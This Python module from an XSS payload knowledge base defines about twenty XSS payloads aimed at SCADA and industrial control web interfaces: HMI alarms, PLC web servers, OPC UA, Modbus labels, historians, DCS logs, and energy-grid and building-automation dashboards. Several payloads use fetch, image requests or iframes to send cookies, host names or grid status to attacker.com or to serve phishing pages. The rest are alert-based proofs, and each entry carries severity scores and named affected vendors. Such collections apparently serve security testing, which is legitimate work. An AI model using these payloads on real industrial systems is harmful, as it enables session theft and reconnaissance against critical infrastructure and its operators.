#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Production
Telegram: https://t.me/EasyProTech

SCADA/ICS XSS Payloads - Industrial Control Systems
Modbus, OPC UA, HMI, PLC, SCADA Web Interfaces
"""

from ..models import PayloadEntry

SCADA_PAYLOADS = {
    # === HMI (Human-Machine Interface) Injections ===
    "scada_hmi_alarm_svg": PayloadEntry(
        payload="CRITICAL ALARM: <svg/onload=fetch('http://attacker.com/exfil?data='+document.cookie)>",
        contexts=["scada", "hmi", "html_content"],
        severity="critical",
        cvss_score=9.5,
        description="HMI alarm message injection with SVG onload for data exfiltration. Alarms often render rich text without sanitization.",
        tags=["scada", "hmi", "alarm", "svg", "exfiltration", "ics"],
        reliability="high",
        attack_surface="server",
        known_affected=["wonderware", "ignition", "factorytalk"]
    ),
    "scada_hmi_alarm_iframe": PayloadEntry(
        payload="MAINTENANCE: <iframe src='http://attacker.com/scada-phish'></iframe>",
        contexts=["scada", "hmi", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="HMI alarm with iframe injection for phishing or malware delivery to operators",
        tags=["scada", "hmi", "alarm", "iframe", "phishing"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_hmi_tag_value": PayloadEntry(
        payload="<img src=x onerror=alert('PLC_COMPROMISED')>",
        contexts=["scada", "hmi", "tag"],
        severity="critical",
        cvss_score=9.0,
        description="PLC tag value injection displayed in HMI dashboard. Tag values from PLCs often rendered without escaping.",
        tags=["scada", "hmi", "plc", "tag", "modbus"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_hmi_setpoint_xss": PayloadEntry(
        payload="100\"><script>fetch('http://attacker.com/'+document.cookie)</script><input value=\"",
        contexts=["scada", "hmi", "html_attribute"],
        severity="critical",
        cvss_score=9.5,
        description="Setpoint value injection breaking out of input field in HMI web interface",
        tags=["scada", "hmi", "setpoint", "attribute-injection"],
        reliability="high",
        attack_surface="server"
    ),

    # === OPC UA (Open Platform Communications Unified Architecture) ===
    "scada_opcua_nodeid": PayloadEntry(
        payload="ns=2;s=<script>alert('OPC_COMPROMISED')</script>",
        contexts=["scada", "opc-ua", "url"],
        severity="high",
        cvss_score=8.5,
        description="OPC UA NodeId string injection. NodeIds displayed in monitoring tools may execute XSS.",
        tags=["scada", "opc-ua", "nodeid", "protocol"],
        reliability="medium",
        attack_surface="server"
    ),
    "scada_opcua_json_value": PayloadEntry(
        payload='{"nodeId": "ns=2;s=Temp", "value": "<img src=x onerror=alert(1)>"}',
        contexts=["scada", "opc-ua", "json"],
        severity="high",
        cvss_score=8.5,
        description="OPC UA JSON value injection in REST API responses rendered in web dashboards",
        tags=["scada", "opc-ua", "json", "rest-api"],
        reliability="medium",
        attack_surface="server"
    ),
    "scada_opcua_browse_name": PayloadEntry(
        payload='<opc:BrowseName><script>alert(1)</script></opc:BrowseName>',
        contexts=["scada", "opc-ua", "xml"],
        severity="high",
        cvss_score=8.0,
        description="OPC UA XML BrowseName element injection in node browser interfaces",
        tags=["scada", "opc-ua", "xml", "browse"],
        reliability="medium",
        attack_surface="server"
    ),

    # === Modbus Protocol ===
    "scada_modbus_register_name": PayloadEntry(
        payload="TEMP_SENSOR_<script>alert(1)</script>",
        contexts=["scada", "modbus", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Modbus register name/description injection in SCADA web interface",
        tags=["scada", "modbus", "register", "naming"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_modbus_coil_label": PayloadEntry(
        payload="VALVE_01<img src=x onerror=alert('MODBUS_XSS')>",
        contexts=["scada", "modbus", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Modbus coil label injection displayed in operator interface",
        tags=["scada", "modbus", "coil", "label"],
        reliability="high",
        attack_surface="server"
    ),

    # === Historian / Data Logging ===
    "scada_historian_comment": PayloadEntry(
        payload="Maintenance note: <script>new Image().src='http://attacker.com/?c='+document.cookie</script>",
        contexts=["scada", "historian", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Historian comment/annotation injection. Comments stored and displayed to all operators.",
        tags=["scada", "historian", "stored-xss", "annotation"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_historian_tag_description": PayloadEntry(
        payload="Temperature Sensor <svg onload=alert('HISTORIAN_XSS')>",
        contexts=["scada", "historian", "html_content"],
        severity="high",
        cvss_score=8.5,
        description="Historian tag description injection in trend viewer interfaces",
        tags=["scada", "historian", "tag", "trend"],
        reliability="high",
        attack_surface="server"
    ),

    # === PLC Web Servers ===
    "scada_plc_webserver_param": PayloadEntry(
        payload="/config?name=<script>alert('PLC_WEB')</script>",
        contexts=["scada", "plc", "url"],
        severity="critical",
        cvss_score=9.5,
        description="PLC embedded web server parameter injection. Many PLCs have minimal web interfaces with no sanitization.",
        tags=["scada", "plc", "webserver", "reflected"],
        reliability="high",
        attack_surface="server",
        known_affected=["siemens s7", "allen-bradley", "schneider m340"]
    ),
    "scada_plc_diagnostic_page": PayloadEntry(
        payload="<img src=x onerror=fetch('http://attacker.com/plc-dump?ip='+location.host)>",
        contexts=["scada", "plc", "html_content"],
        severity="critical",
        cvss_score=9.5,
        description="PLC diagnostic page injection for network reconnaissance from operator workstation",
        tags=["scada", "plc", "diagnostic", "recon"],
        reliability="high",
        attack_surface="server"
    ),

    # === SCADA Protocol Gateways ===
    "scada_gateway_device_name": PayloadEntry(
        payload="RTU_001<script>alert('GATEWAY_XSS')</script>",
        contexts=["scada", "gateway", "html_content"],
        severity="high",
        cvss_score=8.5,
        description="Protocol gateway device name injection in management interface",
        tags=["scada", "gateway", "rtu", "device-name"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_gateway_error_log": PayloadEntry(
        payload="Connection failed: <img src=x onerror=alert(1)>",
        contexts=["scada", "gateway", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Gateway error log injection. Error messages often displayed without encoding.",
        tags=["scada", "gateway", "error-log", "stored"],
        reliability="high",
        attack_surface="server"
    ),

    # === DCS (Distributed Control System) ===
    "scada_dcs_operator_note": PayloadEntry(
        payload="Shift handover: <svg/onload=alert('DCS_XSS')>",
        contexts=["scada", "dcs", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="DCS operator note/shift log injection affecting all operators viewing the log",
        tags=["scada", "dcs", "operator", "shift-log", "stored"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_dcs_recipe_name": PayloadEntry(
        payload="BATCH_001<script>alert('RECIPE_XSS')</script>",
        contexts=["scada", "dcs", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="DCS batch recipe name injection in recipe management interface",
        tags=["scada", "dcs", "recipe", "batch"],
        reliability="high",
        attack_surface="server"
    ),

    # === Energy Management Systems ===
    "scada_ems_substation_name": PayloadEntry(
        payload="SUBSTATION_A<img src=x onerror=alert('EMS_XSS')>",
        contexts=["scada", "ems", "html_content"],
        severity="critical",
        cvss_score=9.5,
        description="Energy Management System substation name injection in grid monitoring",
        tags=["scada", "ems", "substation", "grid", "energy"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_ems_breaker_status": PayloadEntry(
        payload="OPEN<script>fetch('http://attacker.com/grid-status')</script>",
        contexts=["scada", "ems", "html_content"],
        severity="critical",
        cvss_score=9.5,
        description="Breaker status field injection in EMS for grid state exfiltration",
        tags=["scada", "ems", "breaker", "exfiltration"],
        reliability="high",
        attack_surface="server"
    ),

    # === Building Automation Systems (BAS) ===
    "scada_bas_zone_name": PayloadEntry(
        payload="HVAC_ZONE_1<svg onload=alert('BAS_XSS')>",
        contexts=["scada", "bas", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="Building Automation System zone name injection in facility management",
        tags=["scada", "bas", "hvac", "building", "zone"],
        reliability="high",
        attack_surface="server"
    ),
    "scada_bas_schedule_name": PayloadEntry(
        payload="WEEKEND_SCHEDULE<img src=x onerror=alert(1)>",
        contexts=["scada", "bas", "html_content"],
        severity="high",
        cvss_score=8.0,
        description="BAS schedule name injection in scheduling interface",
        tags=["scada", "bas", "schedule", "building"],
        reliability="high",
        attack_surface="server"
    ),
}

SCADA_TOTAL = len(SCADA_PAYLOADS)
